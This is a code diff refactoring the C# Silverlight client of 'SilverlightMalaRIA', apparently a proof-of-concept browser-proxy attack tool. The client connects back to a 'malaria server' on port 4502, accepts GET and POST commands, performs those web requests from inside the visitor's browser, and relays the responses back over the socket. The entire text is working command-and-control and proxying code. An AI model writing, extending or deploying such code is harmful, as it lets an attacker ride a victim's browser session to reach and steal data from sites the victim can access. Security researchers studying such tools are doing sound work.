@@ -13,12 +13,14 @@ namespace SilverlightMalaRIA
 {
     public partial class MainPage : UserControl
     {
+        //Config
+        private const int Port = 4502;
+        private const string Hostname = "localhost";
+
 
         private readonly Socket _socket;
         private readonly HtmlDocument _document;
 
-        private const int port = 4502;
-        private const string hostname = "localhost";
 
 
         public MainPage()
@@ -28,9 +30,9 @@ namespace SilverlightMalaRIA
             _document = HtmlPage.Document;
             try
             {
-                Log("Connecting back to malaria server (" + hostname + ":" + port + ")...");
+                Log("Connecting back to malaria server (" + Hostname + ":" + Port + ")...");
                 _socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                var args = new SocketAsyncEventArgs { RemoteEndPoint = new DnsEndPoint(hostname, port, AddressFamily.InterNetwork) };
+                var args = new SocketAsyncEventArgs { RemoteEndPoint = new DnsEndPoint(Hostname, Port, AddressFamily.InterNetwork) };
                 args.Completed += OnConnected;
                 _socket.ConnectAsync(args);
             }
@@ -62,7 +64,7 @@ namespace SilverlightMalaRIA
         public void OnReceive(object o, SocketAsyncEventArgs e)
         {
             string message = Encoding.UTF8.GetString(e.Buffer, 0, e.BytesTransferred);
-            Regex msgRex = new Regex("([^ ]+) ([^ ]+) ([^ ]+)( (.*))?");
+            var msgRex = new Regex("([^ ]+) ([^ ]+) ([^ ]+)( (.*))?");
             Match match = msgRex.Match(message);
             if (match.Success)
             {
@@ -72,14 +74,12 @@ namespace SilverlightMalaRIA
                     var client = new WebClient();
                     if (match.Groups[1].Value == "GET")
                     {
-                        client.OpenReadCompleted += OnReadCompleted;
+                        client.OpenReadCompleted += OnGetCompleted;
                         client.OpenReadAsync(new Uri(match.Groups[2].Value));
                     } else
                     {
-                        client.OpenWriteCompleted += OnWriteCompleted;
-                        client.OpenReadCompleted += OnReadCompleted;
-                        var context = new Context { Client = client, Data = match.Groups[5].Value };
-                        client.OpenWriteAsync(new Uri(match.Groups[2].Value), "POST", context);
+                        client.UploadStringCompleted += OnPostCompleted;
+                        client.UploadStringAsync(new Uri(match.Groups[2].Value), "POST", match.Groups[5].Value);
                     }
                 }
                 catch(Exception ex)
@@ -95,29 +95,38 @@ namespace SilverlightMalaRIA
         }
 
 
-        private void OnWriteCompleted(object sender, OpenWriteCompletedEventArgs e)
+        private void OnPostCompleted(object sender, UploadStringCompletedEventArgs e)
         {
-            var context = (Context)e.UserState;
-            byte[] bytes = Encoding.UTF8.GetBytes(context.Data);
-            e.Result.Write(bytes, 0, bytes.Length);
-            Log("Wrote " + bytes.Length + " bytes as POST data");
-            e.Result.Flush();
-            //What to put here?
+            if(e.Error != null)
+            {
+                Send("HTTP/1.1 502 Not accessible", false);
+            } 
+            else
+            {
+                byte[] data = Encoding.UTF8.GetBytes(e.Result);
+                Send(data.Length + ":", data, false);
+            }
         }
 
-        private void OnReadCompleted(object sender, OpenReadCompletedEventArgs e)
+        private void OnGetCompleted(object sender, OpenReadCompletedEventArgs e)
         {
-            ReadFromStreamAndSendBack(e.Result);
+            if (e.Error != null)
+            {
+                Send("HTTP/1.1 502 Not accessible", false);
+            }
+            else
+            {
+                ReadFromStreamAndSendBack(e.Result);
+            }
         }
 
         private void ReadFromStreamAndSendBack(Stream streamResponse)
         {
             var fullBuffer = new List<byte>();
             var buffer = new byte[4096];
-            int length;
             do
             {
-                length = streamResponse.Read(buffer, 0, buffer.Length);
+                int length = streamResponse.Read(buffer, 0, buffer.Length);
                 for (int i = 0; i < length; i++) fullBuffer.Add(buffer[i]);
             } while (fullBuffer.Count < streamResponse.Length);
 
@@ -136,6 +145,11 @@ namespace SilverlightMalaRIA
         public void OnSend(object o, SocketAsyncEventArgs e)
         {
             Log("Data sent back: " + e.Buffer.Length);
+        }
+
+        public void Send(string message, bool skipLog)
+        {
+            Send(message, null, skipLog);
         }
 
         public void Send(string message, byte[] data, bool skipLog)
